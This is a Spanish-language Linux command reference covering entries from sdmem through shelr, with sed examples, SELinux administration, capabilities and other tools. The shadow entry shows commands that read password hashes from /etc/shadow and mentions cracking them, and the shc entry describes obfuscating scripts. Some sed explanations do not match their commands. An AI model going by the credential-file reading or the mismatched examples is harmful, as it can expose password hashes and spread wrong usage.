# sdmem -v -l -l (producirá un terminal llena de asteriscos **** para mostrar actividad mientras se sobrescribe el espacio libre en RAM)


seashells
[python-pip]. Herramienta que canaliza la salida de un comando de la terminal a la web en tiempo real. Para instalar:
# pip install seashells
Uso básico:
$ ip a | seashells
	serving at https://seashells.io/v/NNbRnMCJ
	1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
	    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
	    inet 127.0.0.1/8 scope host lo
	       valid_lft forever preferred_lft forever
	...
Abriendo el navegador y colocando la url que da la linea "serving at https://seashells.io/v/NNbRnMCJ" mostrará la salida del comando.
$ htop | seashells --delay 5 (con actualización automática cada espacio de tiempo indicado)


sed
Permite borrar líneas, registros o sustituir cadenas de caracteres dentro de las líneas.
Archivo base para ejemplo (Empleado -- Precio/hora -- Horas trabajadas – Cómo las cobra):
	$ cat lista
	Juan Gomez 6 10 banco
	Clara Fuentes 7 12 banco
	Antonio Cano 6 13 metálico
	José Bueno 7 0 banco
	Matías Crespo 5 8 metálico
	Isabel Ruiz 7 0 metálico
	María Monzón 9 16 metálico
$ sed -n 4p lista (Mostrar la linea 4 del fichero)
$ sed -n 4,5p lista (Mostrar la 4ª y la 5ª)
$ sed -n '4,$p' lista (Mostrar de la 3ª al final del fichero)
$ sed -n '/^\Ant/,$p' lista (Mostrar desde la primera linea que empiece por “Ant” hasta el final)
$ sed -n '/Clara/,/Bueno/p' lista (Mostrar sólo los parrafos desde “Clara” hasta “Bueno”)
$ sed G lista (Mostrar cada linea seguida de una linea en blanco)
$ sed “n;d” lista (Suprimir las lineas en blanco)
$ sed -n '/Ju/p' lista (Mostrar las lineas que cumplen el patrón “Ju” en alguno de sus campos)
$ sed '4d' lista (Borrar la 4ª linea del fichero)
$ sed -e \$d lista (Borrar la última linea del fichero)
$ sed '$d' lista (Lo mismo)
$ sed -e '/J/d' lista (Borrar las lineas que empiecen por "J")
$ sed '2d' lista (Borrar la segunda linea)
$ sed '1,2d' lista (Borrar la 1ª y la 2ª)
$ sed -e 's/ .*//' lista (Borrar a partir del primer espacio en blanco)
$ sed -e '/^\Ant/,$d' lista (Borrar desde la primera linea que empiece por "Ant" hasta el final)
$ sed '2,/Ruiz/d' lista (Borrar desde la 2 linea hasta la que tenga "Ruiz")
$ sed '/^$/d lista (Borrar las lineas en blanco de un archivo. En "lista" no procede)
$ sed '3!s/metálico/gratis/' lista (Cambiar "metálico" por "gratis" excepto en la 3 linea)
$ sed '/Cano/!s/met/tem/' lista (Cambiar "met" por "tem" en las lineas que no tengan "Cano")
$ sed 's/banco/cheque/' lista (Cambiar campos: banco por cheque)
$ sed 'y/J-C/j-c/' lista (Cambiar las "J" y la "C" mayúsculas por minúsculas)
$ sed -e "s/[aeio]/u/g" lista (Substituye las vocales por "u")
$ sed -e 's/ /\t/g' lista (Substituir los espacios por tabulaciones)
$ sed -e :a -e 's/^.\{1,77\}$/ &/;ta' -e 's/\( *\)\1/\1/' lista (Alinear al centro)
$ cat lista | sed -n '4,$p' (Todas las opciones pueden usarse como tubería substituyendo "lista" por “cat lista |”)
$ sed -n '$=' lista (Contar lineas de un archivo [emulador de wc -l])
$ sed 's/^/     /' lista (Insertar 5 espacios en blanco delante de cada linea)
$ sed '2i\ \' lista (Insertar una linea en blanco despues de la primera linea)
$ sed '2i\ \' | sed '4i\ \' lista (Insertar una linea en blanco despues de la primera linea y de la tercera)
$ sed -n 's/Fuentes/Ruiz/p' lista (Imprimir solo líneas reemplazadas. La opción -n suprime filas duplicadas generadas por el indicador /p e imprime las líneas reemplazadas solo una vez)
$ sed -i 'n;G;' lista (Insertar una linea en blanco cada 2 lineas)
Otros ejemplos:
$ sed -e '/^#/d' /etc/fstab (Mostrar lineas no comentadas de un archivo)
$ ls * | sed -e 'p;s/foto/FOTO/' | xargs -n2 mv (Substituir "foto" por "FOTO" en todo los archivos del directorio)
$ sed -i 's/Juan/Pedro/g' *.txt (Cambiar “Juan” por “Pedro” en todos los archivos .txt del presente directorio)
$ sed '/[0-9]\{4\}/p' archivo (Mostrar sólo las lineas con 4 dígitos seguidos)
$ sed 's/^[ ^t]*//' archivo (Borrar todos los espacios delante de cada linea)
$ echo "      Linux es genial" | sed 's/^ *//' (lo mismo)
$ sed 's/[ ^t]*$//' archivo (Borrar todos los espacios detras de cada linea)
$ echo "Linux es genial      " | sed 's/* $//' (Lo mismo)
$ echo "Linux es genial" | sed 's/......$//' (Borrar los últimos 6 caracteres de una linea)
$ cat file.txt | sed 's/^.//' (Eliminar el primer caracter de cada linea de un archivo)
$ echo "Linux es genial" | sed 's/^.....//' (Borrar los primeros 5 caracteres de una linea)
$ cat file.txt | sed 's/..$//' (Eliminar los dos últimos caracteres de cada linea de un archivo)
$ cat file.txt | sed 's/...$//;s/^...//' (Eliminar los tres primeros y tres últimos caracteres de cada linea de un archivo)
$ sed 's/^[ ^t]*//;s/[ ^]*$//' archivo (Borrar todos los espacios delante y detras de cada linea)
$ sed -r "s/\<(reg|exp)[a-z]+/\U&/g" archivo (Cambiar números 3333 por 3.333. Parámetro -r sirva activa las expresiones regulares extendidas de sed)
$ sed "5i ---\n categories:tractatus\n date: 2015-05-22\n title: res\n ---\n" archivo.txt (Insertar texto entre una linea y otra. Por ejemplo en la linea 5)
$ sed -i "2 s|^|texto al principio|" archivo (Insertar texto al pricipio de la 2ª linea)
$ sed -i "s|^|texto al principio|g" archivo (Insertar texto al principio de todas las lineas)
$ sed -i "5 s|$|texto al final|" archivo (Insertar texto al final de la linea 5)
$ sed -i "s|$|texto al final|g" archivo (Insertar texto al final de todas las lineas)
$ sed -n '/Texto/=' archivo (Mostrar el número de línea que contiene una ocurrencia)
$ sed -i "/${VARIABLE}/d" archivo (Utilizar variables dentro de sed)
$ sed -n "/^${NUM_BAIXA}/p" archivo (Que la variable esté al principio de la linea)
$ sed = fichero.txt | sed 'N;s/\n/\t/' (Numerar lineas [ como cat -n archivo])
$ find . -type f -exec sed -i -e 's/esto/aquello/g' {} \; (Reemplazar una cadena "esto" por "aquello" en muchos archivos)
$ find . -type f -exec -name '*.txt' sed -i -e 's/esto/aquello/g' {} \; (Lo mismo pero sólo en archivos txt)
$ find . -type f -exec sed -i -e '/casa/d' {} \; (Eliminar todas las lineas que coincidan la palabra "casa")
$ find . -type f -exec -name '*.txt' sed -i -e '/pattern/d' {} \; (Lo mismo pero sólo en archivos.txt)
$ sed -i "s|esto|aquello|' archivo.txt (Reemplazar "esto" por "aquello" de forma real en archivo.txt)
$ sed -i 's/localhost\/tractatus/localhost\/emacs/g' *.html (En todos los archivos html del directorio)
$ echo " href=http://localhost/tractatus/2ping.html" | sed 's/localhost\/tractatus/localhost\/emacs/' (Cuando existen barras entre palabras han de escaparse)
$ echo "la casa es casa de todos los sin casa" | sed 's/casa/piso/2' (Substituir la segunda coincidencia de cada linea)
$ echo "la casa, una casa, se casa, gran casa, no casa, la casa, se casa, mas casa" | sed 's/casa/pìso/3g' (Reemplaza desde la tercera coincidencia a la última de cada linea)
$ echo "Linux es un Sistema Genial" | sed 's/\(\b[A-Z]\)/\(\1\)/g' (Poner entre parentesis la primera letra de cada palabra que empieza por mayuscula)
$ cat ab.html |  sed -n '5 s/#/ /p' (Reemplazar solo en la 5ª linea el caracter "#" por un espació)
$ sed '2~2 w texto2.txt' texto.txt (Escribe la 2 linea de texto.txt en el archivo texto2.txt borrando su contenido)
$ sed -i '/plantilla/G' listado.txt (Insertar linea en blanco despues de un patron [plantilla en este caso])
$ sed -i '/plantilla/{x;p;x;}' listado.txt (Insertar una linea en blanco antes de un patron [plantilla en este caso])
$ sed -i '/plantilla/{x;p;x;G;}' listado.txt (Insertar una linea en blanco antes y dispues de aparecer un patron [plantilla])
$ sed = listado.txt | sed 'N;s/\n/\t/' > listado-numerado.txt (Añadir número de linea al principio de cada una)
$ sed '/./=' listado.txt | sed '/./N; s/\n/- /' > listado-numerado.txt (Añadir número de linea al principio si no está en blanco)


see
Forma de visualizar imagenes con imagemagic.
$ see image.jpg


seeker
Comprobar la velocidad del disco duro, pero no en el inicio que es la parte más rápida como hace hdparm, sino de forma aleatoria en todo el espacio del disco.
# seeker /dev/sda


select
Realiza menús de forma rápida y simple:
Algunos ejemplos:
1.-
	#!/bin/bash
	OPCIONES="Uso_linux Todavía_estoy_con_windows"
	select opt in $OPCIONES; do
		if [ "$opt" = "Uso_linux" ]; then
			echo "Bravo, usas el mejor sistema..."
			exit
		elif [ "$opt" = "Todavía_estoy_con_windows" ]; then
			echo "¡Evoluciona de una vez!"
			exit
		else
			echo opción errónea
		fi
	done
2.-
	#!/bin/bash
	OPCIONES="hostname pwd exit"
	select opt in $OPCIONES; do
		if [ "$opt" = "hostname" ]; then
			echo $HOSTNAME
		elif [ "$opt" = "pwd" ]; then
			pwd
		elif [ "$opt" = "exit" ]; then
			echo "salir"
			exit
		else
			echo opción errónea
		fi
	done
3.-
	#!/bin/bash
	PS3='Elija una opción : '
	options="linux win salir"
	echo opciones : $options
	select opt in $options
	do
    	if [ "$opt" = "salir" ]; then
        	echo "Salgo..."
        	exit
    	elif [ "$opt" = "linux" ]; then
        	echo "Muy bien..."
    	else
        	echo "Terriblemente mal..."
    	fi
	done


select-default-ispell
Selecciona el diccionario ispell predeterminado.
# select-default-ispell


select-default-wordlist
Indica a qué lista de palabras debe apuntar el enlace simbólico "/usr/share/dict/words". Esto proporcionará una lista simple de palabras del diccionario para la corrección ortográfica básica y las búsquedas de palabras.
# select-default-wordlist


select-editor
Proporciona un mecanismo coherente para seleccionar y almacenar un editor sensible preferido por el usuario.
$ select-editor (Muestra los instalados y marca el predeterminado. Solicita el número del que se desea)


selinux
[selinux-basics selinux-policy-default]. SELinux proporciona una forma de acceso a recursos basada en políticas de control de acceso obligatorio [mandatory access control, MAC] incorporado en el kernel. Existen un conjunto de reglas de autorización [políticas] las cuales determinan si una operación sobre un objeto [Archivos, directorios, dispositivos...] realizada por un sujeto esta o no permitida basándose en los atributos de ambos. Linux utiliza por defecto el control de acceso a discreción [discretionary access control, DAC] basada en los propietarios y grupos a los que pertenece un objeto en los que un usuario normal puede cambiar los permisos de los archivos que posee con el comando chmod. Con selinux se limita el acceso que tienen las aplicaciones a otras aplicaciones y a los ficheros, impidiendo que un proceso pueda modificar cualquier fichero del usuario con el que se lanzó. En DAC el acceso esta descentralizado, siendo el propietario de cada objeto el encargado de asignar los permisos de los diversos grupos que accederán a ellas. En cambio con el MAC los objetos y los sujetos tan solo tienen atributos, pero son las políticas las que se encargan de autorizar o denegar una acción. Ver comandos getsebool y setsebool.
Los módulos SELinux disponibles se almacenan en el directorio /usr/share/selinux/default/.
# semodule -i módulo.pp (habilitar un módulos en la configuración actual. La extensión pp significa paquete de política [«policy package»]).
# semodule -r módulo (Elimina un módulo de la configuración actual)
# semodule -l (Enumera los módulos habilitados actualmente)
# semanage login -a -s staff_u juan (mapear una cuenta a un usuario especifico de SELinux)
# restorecon -R -F /home/juan (etiquetar los ficheros del usuario mapeado juan)
# semanage user -l (enumera las asociaciones entre las identidades de usuario de SELinux y los roles permitidos)
# semanage login -d juan (elimina la asociación asignada al usuario juan)
# semanage login -m juan (Modificar la asociación asignada al usuario)
# semanage login -l (enumera las correspondencias actuales entre identificadores de usuarios y entidades SELinux)
tabla de los usuarios estándar SELinux disponibles:
	user_u 	(Usuario normal que se utilizan para cuentas de usuario que no van a ser empleadas para administrar ningún servicio del sistema)
	staff_u (Para administradores con derechos para conmutar roles y ganar privilegios elevados)
	root (Cuenta root ligeramente diferente de la cuenta staff_u. Los ficheros protegidos por control de acceso basado en root no pueden ser gestionados por los staff_u)
	sysadm_u (Administración del sistema. Por defecto, esta cuenta no se utiliza inmediatamente ya que este usuario obtiene de forma inmediata el rol administrativo (por lo que staff_u y root todavía necesitarán conmutar roles).
	system_u (administrar servicios. Nunca se debe utilizar para usuarios finales ya que ofrece acceso directo al rol del sistema)
	unconfined_u 	Usado cuando la directriz es targeted, este usuario SELinux tiene muchos privilegios (esencialmente no está limitado en sus acciones, aunque todavía se gestiona través de SELinux con una directriz "muy abierta").


sendmail
[libnet-ssleay-perl libio-socket-ssl-perl]. Herramienta que permite enviar correos a partir de un servidor externo (p.g gmail). El principal inconveniente es que la contraseña queda expuesta en texto plano en la terminal.
$ sendmail -f nombrecuenta@gmail.com -t destinatario@hotmail.com -s smtp.gmail.com:587 -u "Asunto" -m "Cuerpo del mensaje" -a archivo_adjunto -v -xu nombrecuenta -xp clavecuenta -o tls=yes
	Nota.- Tanto el asunto como el Cuerpo del mensaje entre comillas
Si queremos poner más destinatarios, separar los correos con punto y coma [;]:
	-t usuario1@hotmail.com;usuario2@gmx.es;usuario3@gmail.com
Algunas opciones:
-cc usuario5@tml.org
-bcc usuario6@tml.org
-a archivo.pdf


sensible-utils
Varios programas para seleccionar un navegador, editor o paginador.
$ select-editor (muestra los editores disponibles  para seleccionar el deseado)
$ sensible-browser (abre el navegador presdeterminado)
$ sensible-editor (abre el editor predeterminado)
$ sensible-pager (abre como less u archivo de texto)


sensors
Mostrar las lecturas de todos los sensores de temperatura de los chips.
$ sensors (forma básica)
$ sensors -A (No mostrando el adaptador para cada chip)


sensors-conf-convert
[lm-sensors]. El propósito de esta herramienta es convertir sensors.conf del formato lm_sensors versión 2 al formato lm_sensors versión 3. El archivo de configuración antiguo se lee desde la entrada estándar y el nuevo se escribe en la salida estándar.
# sensors-conf-convert < /etc/sensors.conf > /etc/sensors3.conf


sensors-detect
[lm-sensors]. Monitorizar temperatura y voltage.
$ sensors
$ sensors -f (Muestra la temperatura en grados Fahrenheit)


seq
Crea secuencias de números.
$ seq 7 12 (entre el 7 y el 12)
$ seq 7 2 12 (entre el 7 y el 12 con un incremento de 2 en 2)
$ seq -w 7 12 (entre el 7 y el 12 con el mismo tamaño)
$ seq -s_ 7 12 (con un guión bajo entre cada número)
$ seq -s'#' 0 $(tput cols) | tr -d '[:digit:]'  (Escribe una raya de “#” en toda la anchura de la terminal)


service
Inicia o para servicios.
# service apache2 start (Arranca apache2)
# service apache2 stop (Para apache2)
# service apache2 restart (Reinicia apache2)
# service --status-all (servicios de un sistema en ejecución y en listen)
# service --status-all | grep + (los que estan en ejecución)


sestatus
Devuelve el estado de SELinux y la política que se está usando. Ver selinux y getsenforce
# sestatus
# sestatus -v (estado detallado de un sistema ejecutando SELinux)


set
desplegar todas las variables [y sus valores] que el shell controla y otorgar nuevas variables.
$ set -o (listado de todas las variables y si estan o no activadas)
Algunas ejemplos que se muestran en la salida:
$ set -o ignoreeof (evitar que la terminal se cierre al presionar Control-D)
$ set -o noglob (desactivar caracteres especiales en la shell: ?, [, ], * y ~)
$ set prompt = "%/ - %t - %u - $$$$" (que el prompt diga el directorio, la fecha, el usuario i sigan 4 signos de "$")
$ set history=2000 (que el historial guarde los últimos 2000 comandos entrados)
$ set -o vi (cambiar a las teclas del modo de edición de vi . Por defecto bash utiliza el modo emacs)
$ set -o noclobber (activar la protección de sobreescritura en las tuberias si el archido ya existe [ver noclobber] )
$ set +o noclobber (Desactivar la protección. Opción por defecto)
1.-
Depurar partes de un script encerrando el código:
	set -x
	código a depurar
	set +x


setarch
Esta utilidad le dice al núcleo que informe de una arquitectura diferente a la actual a un programa, luego ejecutará dicho programa en este entorno.
$ setarch --list (Listado de arquitecturas posible)
$ setarch $(uname -m) --uname-2.6 script.sh (A partir de este momento, siempre que se llame a ese script pensará que se está ejecutando con un kernel 2.6)


setcap
Permite asignar permisos especiales para que una aplicación se pueda ejecutar en un puerto por debajo del 1024 por un usuario sin permisos de administrador. [relacionada con getcap]
# setcap cap_net_raw+ep /usr/bin/ping (dar los permisos)
# setcap -r /usr/bin/ping (quitarlos)
$ setcap cap_net_bind_service-ep /usr/bin/ping (otra forma de quitarlos)
$ setcap cap_net_admin,cap_net_raw+ep /usr/bin/wireshark (otorgar dos capabilitys)
Nota.- +ep significa que la capability es efectiva [e] y permitida [p].


setfacl
Establece, modifica o elimina la lista de control de acceso a un archivo.
$ setfacl -m u:usuario:rx archivo (Conceder acceso de lectura y ejecución a un usuario sobre un archivo)
$ setfacl -x u:usuario file (Eliminar el acceso a un archivo a un usuario)
$ setfacl -b archivo (elimina toda la lista de control de acceso a archivo)
$ setfacl -d -m u::rw archivo  (Modifica la lista de control de acceso por defecto de archivo para todos los usuarios)
$ setfacl -a archivo (muestra la lista de control de acceso de un archivo)
$ getfacl -d archivo (ver la lista de control de acceso por defecto)
$ getfacl -R dir (lista el control de acceso a todos los archivos,  directorios y subdirectorios del directorio mencionado)


setfont
Modificación de las fuentes en el arranque (arch)
# setfont (cargar la por defecto)
# setfont ter-114f (especificar una)
Nota.- fuentes en /usr/share/consolefonts


setgid
Ejecutar un proceso como el grupo que posee el archivo.
        $ ls -l /usr/bin/crontab
        -rwxr-sr-x 1 root crontab 43648  2 de març   2023 /usr/bin/crontab
Donde se observa que los permisos del grupo son "r-s" en lugar de "r-x".


setleds
Controla los leds del teclado
$ setleds -D +num >> /dev/tty1  (activa el teclado numérico)
$ setleds -D -caps >> /dev/tty1 (desactiva las mayúsculas)
$ setleds -D +scroll >> /dev/tty1 (activa el scroll)


setlogcons
Enviar mensajes del kernel a la consola especificada.
# setlogcons 1 (enviar todos los mensajes del kernel a tty1)


setools
Parche del kernel de Linux y una serie de utilidades con funcionalidad de seguridad mejorada diseñadas para agregar controles de acceso obligatorios a Linux. Son herramientas para analizar la política de seguridad en sistemas SELinux. Incluye las siguientes aplicaciones: sechecker [Análisis automatizado basado en archivos de configuración], sediff [Comparar dos políticas para encontrar diferencias], sedta [Realizar análisis de transición de dominio], seinfo [Enumere los componentes de la política], seinfoflow [Realizar análisis de flujo de información] y sesearch [Reglas de búsqueda (permitir, type_transition, etc.)].


setpci
[pciutils]. Utilidad para consultar y configurar dispositivos PCI.
# setpci --dumpregs (lista de todos los registros y capacidades PCI conocidos)


setsebool
Permite activar/desactivar las políticas en selinux. Ver getsebool
# setsebool httpd_can_network_connect on (Activamos el permitir a Apache realizar conexiones de red)
# setsebool -P httpd_can_network_connect on (Hacer el cambio persistente)
# setsebool httpd_disable_trans 1 (Otra forma de desactivar una politica. Con 0 se activa)


setserial
Establecer y/o reportar la información de configuración asociada con un puerto serie. Esta información incluye qué puerto de I/O y qué IRQ está utilizando un puerto serie particular.
$ setserial -G /dev/ttyS0


setsid
Permite continuar ejecutando un comando aunque se cierre la terminal o la sesión ssh. Parecido a nohup [ver] o screen [ver] aunque a diferencia de estos, no permite volver para ver el estado de proceso.
$ setsid apt-get update


setterm
Modificación de los atributos de la terminal. Algunos flags solo son aplicables a las tty.
$ setterm -r   (La resetea incluso si ha quedado colgada)
$ setterm -cursor off (desaparece el cursor. Con "on" regresa de nuevo)
Opciones:
-foreground green (Color de texto. [black|blue|green|cyan|red|magenta|yellow|white|default])
-background red  (Color de fondo)
-inversescreen on (Intercambia los colores del texto y el fondo)


setuid
Configuración de permisos de un archivo que permite a un usuario ejecutar ese archivo o programa con el permiso del propietario de ese archivo
              $ ls -l /usr/bin/sudo
              -rwsr-xr-x 1 root root 281624 27 de juny   2023 /usr/bin/sudo
Donde se observa que en los permisos del usuario root, son "rws" en lugar de "rwx" y que es ejecutable por todo el mundo por la última "x'"en los permisos. La "s" que sustituye a la "x" indica que cuando un usuario ejecuta este programa, el sistema operativo ejecutará ese archivo no como el usuario que lo ejecuta, sino como el usuario root. Si la "s" fuera mayúscula [S] significa que el usuario que posee el archivo no tiene permisos de ejecución. Podemos agregar ese permiso usando el comando
# chmod u+x archivo


setxkbmap
Configurar teclado [para X.org] en la sesión actual.
$ setxkbmap -layout es
$ setxkbmap es (configurarlo en español)
$ setxkbmap -query (ver la configuración actual)


sexy-bash-prompt
Prompt para bash que también puede usarse para status y ramas en git. Utiliza tput, un programa para configurar terminales usadas por la shell. Antes de la instalación es preciso hacer copia de seguridad de .bashrc ya que la instalación de este paquete crea una archivo a su medida.
$ cp ~/.bashrc ~/.bashrc_old
Instalación y descarga:
$ git clone https://github.com/twolfson/sexy-bash-prompt
$ cd sexy-bash-prompt
# make intall
$ source ~/.bashrc
Terminada la relectura de .bashrc, veremos los cambios al abrir una terminal.


sfdisk
Mostrar un listado de las particiones con sus características exactas.
# sfdisk -d /dev/sda (Muestra la tabla de particiones de sda)
# sfdisk -d /dev/sda | sfdisk /dev/sdb (copia la tabla de sda a sdb)
# sfdisk -d /dev/sda > tabla.bak (Guardar tabla de particiones)
# sfdisk /dev/sda < tabla.bak (Restaurar tabla de particiones)


sfeed
Analizador RSS y Atom y algunos programas de formato. Convierte fuentes RSS o Atom de XML a un archivo separado por TAB. Se incluyen programas de formateo para convertir este formato separado por TAB a varios otros formatos. También se incluyen algunos programas y scripts para importar y exportar OPML y para buscar, filtrar, fusionar y ordenar elementos del feed. Incluye las aplicaciones: sfeed_atom, sfeed_content, sfeed_curses, sfeed_frames, sfeed_gopher, sfeed_html, sfeed_markread, sfeed_mbox, sfeed_opml_export, sfeed_opml_import, sfeed_plain, sfeed_twtxt, sfeed_update, sfeed_web y sfeed_xmlenc
$ mkdir -p "$HOME/.sfeed/feeds" (crear el directorio)
$ sfeed_opml_import < file.opml > "$HOME/.sfeed/sfeedrc" (importar el listado de feeds)
$ sfeed_update (actualizar feeds)
$ sfeed_plain $HOME/.sfeed/feeds/* > "$HOME/.sfeed/feeds.txt" (exportar los feeds en formato txt)
$ sfeed_curses ~/.sfeed/feeds/* (lanzar el lector)


sfill
[paquete secure-delete]. Borrado de todos los rastros de datos del espacio libre del disco. Parecidos parámetros de srm [ver]. Sobreescribe 38 veces el espacio.
# sfill -f dir (Borrado rápito pero inseguro)
# sfill -l dir (Como lanzar dos veces sfill -f)
# sfill -i dir (Borrar solamente inodos en directorio)
# sfill -zv dir (Sobreescribiendo ceros en el último borrado y mostrando el proceso)


sftp
Transferencia encriptada de archivos entre computadoras por ssh.
Ajustes previos:
# nano /etc/ssh/sshd_config
Y colocar las lineas:
	Subsystem sftp internal-sftp
	Match group USER
	 ChrootDirectory /home/USER
	 ForceCommand internal-sftp
	 AllowTCPForwarding no
	 X11Forwarding no
$ sftp USER@host


sg
[sg3-utils]. Identificar dispositivos /dev concectados
# sg_scan -i
# sg_map -i


sgpt
Es utilizado para realizar una sola consulta rápida con ChatGPT en el terminal. Este comando es útil cuando necesitas una respuesta breve o ejecutar una tarea simple.
$ sgpt "¿Cuál es la capital de Rumania?"
$ sgpt "Explícame brevemente qué es una tabla hash en programación"


sh
Interprete de comandos.
$ sh -x script (ejecutará el script y mostrará todas la sentencias que se ejecutan con las variables y comodines ya expandidos)
$ sh -n script (Chequea la sintaxis sin ejecutar el script. Si no encuentra errores devuelve vacio)
$ sh -e script (Obliga a terminar el script aunque algún comando falle)
$ sh -v script (Imprime las lineas de entrada según se leen)


shadow
[/etc/shadow]. Es el archivo donde se guardan las contraseñas de todos los usuarios del sistema y normalmente se compone del nombre de usuario de la cuenta, seguido del hash del password. Como medida de seguridad, el sistema, después de generar el hash del password, agrega un salt y luego genera un nuevo hash. Este proceso funciona genera un algoritmo en un solo sentido, no hay forma de sacar ni "desencriptar" la contraseña real del hash. La única manera de intentar crackear esta contraseña es por medio de diccionarios o fuerza bruta.
# cat /etc/shadow | grep USER (ver el Hash del usuario "USER")
# cat /etc/shadow | grep -E 'USER|root' (ver el Hash del usuario "USER" y el de root)


shar
[shareutils]. Producir un solo archivo a partir de muchos aunque sean todos distintos [png, html, txt, odtn binarios...]. Si se ejecuta un archivo shar recreará los archivos a partir de los que se generó. Tambien pueden extraerse con la aplicación unshar incluyda en shareutils
$ shar * > datos.shar (empaqueta todos los archivos del directorio en el archivo datos.shar)
Primera forma de extraerlos:
        $ chmod +x datos.shar
        $ ./datos.shar
Segunda:
        S unshar datos.shar


sharness
Biblioteca de shell portátil para escribir, ejecutar y analizar pruebas automatizadas para programas Unix. El catálogo de bibliotecas de software que pueden actuar como productores de TAP [Test Anything Protocol], agrupadas por lenguaje de programación es: Ada, C, C++, C#, Common Lisp, Crystal, Elixir, Erlang, Fish, Forth, Fortran, Gambas, Go, Haskell, Igor Pro, Java, JavaScript, Limbo, Lua, MATLAB, OCaml, Omnis Studio, Pascal, Perl5, Perl6, PHP, Prolog, Python, Ruby, Rust, Sass, Shell, SQL, and TypeScript. El ejemplo del funcionamiento de la aplicación sacado de github y adaptado a Debian es:
$ cat simple.t
  #!/bin/sh
  test_description='Mostrar características básicas de Sharness'
  . /usr/share/sharness/sharness.sh
  test_expect_success 'El éxito se informa así' '
      echo hello world | grep hello '
  test_expect_success 'o así' '
      ip a | grep 192 | cut -d " " -f 6 '
  test_expect_success 'Los comandos están encadenados de esta manera' '
      test x = "x" &&
      test 2 -gt 1 &&
      echo success '
  test_expect_failure 'Esperamos que esto falle' '
      cd /home/inexistente '
  test_done
Despues de darle permisos [chmod +x simple.t], cuando se ejecute [./simple.t] creará el directorio test-results y en su interior el archivo de texto con el resultado.
$ cat test-results
total 4
success 3
fixed 0
broken 1
failed 0
Nota.- "test_expect_success" dice "OK" en caso de éxito o "FAIL" en caso de error. "test_expect_failure" dirá "FIXED" en caso de éxito y "known breakage" en caso de error.


shasum
Muestra el hash sha de un fichero con el objetivo de verificar si se producen cambios.
$ shasum -a 512 -t fichero (Usando el algoritmo de 512 bits. Otras opciones: 32 [por defecto] 224, 256, 384, 512224, 512256)


sha1sum
Calcular el hash sha1 de palabras, archivos o directorios.
$ sha1sum archivo
$ sha1sum (Entra en el prompt y espera una palabra. Una vez terminada de escribir, sin pulsar intro, pulsar dos veces Ctrl+d y nos dará el hash)
$ echo -n "linux es un sistema genial" | sha1sum (A partir de una palabra o frase como tuberia)


shc
Ofuscador que encripta el código de un script. Descargar el script de http://www.datsi.fi.upm.es/~frosal/sources/
Instalación:
# cd shc-3.8.9 (entrar en el directorio descomprimido)
# cp shc-3.8.9.c shc.c (evitar error "No rule to make target `shc.c', needed by `shc'")
# mkdir /usr/local/man/man1 (Crear el directorio man1 para evitar el error de "directorio no existe")
# make install (Pulsar "y" a la pregunta "Do you want to continue")
	***	Installing shc and shc.1 on /usr/local
	***	Do you want to continue? y
	install -c -s shc /usr/local/bin/
	install -c -m 644 shc.1 /usr/local/man/man1/
Uso:
$ shc -f script.sh
Creará 2 archivos nuevos:
script.sh  script.sh.x  script.sh.x.c
El ejecutable es el terminado en .x [script.sh.x] que podrá enviarse y ejecutarse de la forma habitual pero sin poder leer el código fuente.
Nota.- El terminado en .x.c es el script pero en lenguaje C. Puede borrarse sin ningún problema.


shell
Termino usado para referirse al interprete de comandos. Los comandos, cuando se escriben en ficheros ejecutables se denominan shell-scripts o programación shell aunque, mirado estrictamente, no se sean un lenguje de programación. El termino shell hace referencia a un programa particular, el Bourne shell [sh] que es un standard unix y, aunque según las distros pueden incluir distintas shells con más características (bash, ash, csh, ksh, tcsh) todas son compatibles con el bourne shell.


shellcheck
Revisión y análisis de código de shell scripts. Realiza una comprobación de estándar POSIX detectando problemas con extensión de variables o variables sin usar, errores de sintaxis o en construccciones lógicas (bucles for/while o condicionales if), fragmentos de código mejorables o cualquier incidencia que pueda ocurrir en dicho código. Es posible que marque falsos positivos, por ejemplo si se usan variables de ambiente y no estan definidas. También está disponible en versión web e incluso como plugin para Atom, Sublime Text, vim o emacs [flycheck] .
$ shellcheck script.sh (Forma básica. Si no muestra nada todo es perfecto)
$ shellcheck -s bash -e SC1003,SC2035 script.sh (especificando el lenguaje y excluir 2 tipos de errores)
Nota.- Los códigos de error generados pueden ser consultados en la Wiki del proyecto (<https://github.com/koalaman/shellcheck>) y por su código en <https://github.com/koalaman/shellcheck/wiki/Directive>


shell-genie
Dota la consola de Inteligencia Artificial centrada en responder únicamente preguntas sobre el sistema operativo GNU/Linux y sus comandos. Instalar y configurar:
$ python3 -m venv .venv (crear un entorno virtual en tu ubicación)
$ source .venv/bin/activate (activar entorno virtua)
$ pipx install shell-genie (instalar)
$ shell-genie init (inicializar la herramienta)
Produce varias preguntas:
        Select backend: [openai-gpt-3.5-turbo/free-genie]: free-genie
        Note that this server will store the requested command, OS, and shell version to improve the model. Also, I cannot guarantee that the server will be up and running 24/7.
        Do you want to continue? [y/n]:
        Do you want to continue? [y/n]:
        Do you want to provide feedback about the generated commands to improve the models? [y/n]:
        Is your OS Debian GNU/Linux 12 (bookworm)? [y/n]:
        The following configuration will be saved:
        {'backend': 'free-genie', 'os': 'Linux', 'os_fullname': 'Debian GNU/Linux 12 (bookworm)', 'shell': 'bash', 'training-feedback': True}
Nota.- Si elegimos la opción “openai-gpt3” tendremos que hacernos una cuenta en su página y recuperar la llave API para proporcionarla. Eligiendo la opción “free-genie” podemos disfrutar de la forma gratuita y participar o no a mejorar la herramienta.
$ shell-genie ask "la pregunta que hacemos" (Para preguntar)


shelltestrunner
Herramienta para probar programas de línea de comandos [o comandos de shell arbitrarios]. Lee pruebas declarativas simples que especifican un comando, alguna entrada y la salida esperada, salida de error y estado de salida.
$ shelltest -c script.sh (mostrando en color las anomalias)
$ shelltest -c dir/* (de todos los scripts del directorio)


shelr
Realizar una grabación de la consola con la posibilidad de subirla a http://shelr.tv. Una vez registrados conseguimos el ID personal. La grabación termina al pulsar Ctrl + d y se almacena en .local/share/shelr/ del usuario o de root. Las medidas de la terminal optimas son 132x43 [lanzar, por ejemplo: lxterminal --geometry=132x43]
$ shelr record (Inicia la grabación despues de solicitar el título)
$ shelr record --sound (Grabar con sonido)
$ shelr list (muestra todos los shellcasts [grabaciones])
$ shelr play ID (Reproduce el especificado en el número ID)
$ shelr dump ID (Volcará la grabación en el directorio actual con extensión .json. Solicita nombre y etiqueta del shellcast)
$ shelr play last (eproduce la última grabación)
